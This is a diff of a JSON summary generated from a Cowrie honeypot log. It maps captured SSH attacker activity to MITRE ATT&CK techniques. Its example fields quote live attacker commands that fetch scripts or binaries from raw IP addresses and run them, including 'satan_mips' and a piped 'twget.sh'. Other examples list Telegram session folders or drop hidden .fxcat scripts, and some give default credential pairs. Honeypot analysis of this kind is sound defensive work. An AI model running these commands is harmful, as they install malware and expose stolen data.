@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-20 08:02:45",
+  "generated": "2026-08-20 09:03:45",
   "totals": {
-    "commands": 440,
-    "login_failed": 1170,
-    "login_success": 47,
-    "sessions": 1294
+    "commands": 489,
+    "login_failed": 1225,
+    "login_success": 51,
+    "sessions": 1347
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1170,
+      "count": 1225,
       "examples": [
         "nginx / 150.136.155.47",
         "tyre / tyre",
@@ -21,30 +21,14 @@
         "tyre / tyre1234"
       ],
       "first": "2026-08-20T00:02:12.859219Z",
-      "last": "2026-08-20T08:02:16.372379Z",
-      "unique_ips": 41
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 47,
-      "examples": [
-        "admin / switch",
-        "admin / admin",
-        "Admin / ",
-        "admin / qwaszx",
-        "enable\\x00 / system\\x00"
-      ],
-      "first": "2026-08-20T01:07:19.606932Z",
-      "last": "2026-08-20T07:50:35.998241Z",
-      "unique_ips": 30
+      "last": "2026-08-20T09:00:51.265947Z",
+      "unique_ips": 46
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 45,
+      "count": 60,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
@@ -53,14 +37,30 @@
         "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
       ],
       "first": "2026-08-20T01:21:21.761677Z",
-      "last": "2026-08-20T07:29:50.494077Z",
-      "unique_ips": 6
+      "last": "2026-08-20T08:56:39.767502Z",
+      "unique_ips": 7
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 51,
+      "examples": [
+        "admin / switch",
+        "admin / admin",
+        "Admin / ",
+        "admin / qwaszx",
+        "enable\\x00 / system\\x00"
+      ],
+      "first": "2026-08-20T01:07:19.606932Z",
+      "last": "2026-08-20T09:00:51.379651Z",
+      "unique_ips": 33
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 38,
+      "count": 42,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -69,23 +69,24 @@
         "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm"
       ],
       "first": "2026-08-20T01:10:19.623993Z",
-      "last": "2026-08-20T07:29:50.489668Z",
-      "unique_ips": 7
+      "last": "2026-08-20T08:56:39.767502Z",
+      "unique_ips": 8
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 11,
       "examples": [
         "uname -s -v -n -r -m",
         "uname -a",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "cat /proc/cpuinfo"
       ],
       "first": "2026-08-20T04:16:38.276000Z",
-      "last": "2026-08-20T07:36:05.350581Z",
-      "unique_ips": 6
+      "last": "2026-08-20T08:48:24.691489Z",
+      "unique_ips": 8
     },
     {
       "id": "T1489",
@@ -105,14 +106,52 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-20T02:31:13.448948Z",
-      "last": "2026-08-20T06:51:04.231011Z",
+      "last": "2026-08-20T08:56:03.723524Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
+      ],
+      "first": "2026-08-20T08:44:43.331036Z",
+      "last": "2026-08-20T08:48:26.223518Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+      ],
+      "first": "2026-08-20T07:29:50.494077Z",
+      "last": "2026-08-20T08:48:26.986751Z",
       "unique_ips": 3
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-08-20T08:44:30.959557Z",
+      "last": "2026-08-20T08:48:23.178182Z",
+      "unique_ips": 2
     },
     {
       "id": "T1059.004",
@@ -152,18 +191,6 @@
       "unique_ips": 1
     },
     {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-20T07:29:50.494077Z",
-      "last": "2026-08-20T07:29:50.494077Z",
-      "unique_ips": 1
-    },
-    {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
@@ -194,12 +221,12 @@
       271
     ],
     [
-      "sh",
-      10
+      "/bin/busybox",
+      17
     ],
     [
-      "/bin/busybox",
-      10
+      "sh",
+      11
     ],
     [
       "zalee",
@@ -215,14 +242,22 @@
     ],
     [
       "enable",
-      5
+      6
     ],
     [
       "system",
-      5
+      6
     ],
     [
       "shell",
+      6
+    ],
+    [
+      "linuxshell",
+      5
+    ],
+    [
+      "ping ;sh",
       5
     ],
     [
@@ -230,20 +265,28 @@
       5
     ],
     [
-      "linuxshell",
-      4
-    ],
-    [
-      "ping ;sh",
-      4
-    ],
-    [
       "enablelinuxshell",
-      3
+      4
     ],
     [
       "cd /proc && cat self/cmdline",
-      3
+      4
+    ],
+    [
+      "busybox",
+      2
+    ],
+    [
+      "/ip cloud print",
+      2
+    ],
+    [
+      "locate D877F783D5D3EF8Cs",
+      2
+    ],
+    [
+      "echo Hi | cat -n",
+      2
     ],
     [
       "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
@@ -251,22 +294,6 @@
     ],
     [
       "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /var/run/.fxcat && sh /var/run/.fxcat && cd /var/run/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /dev/shm/.fxcat && sh /dev/shm/.fxcat && cd /dev/shm/",
       1
     ]
   ]
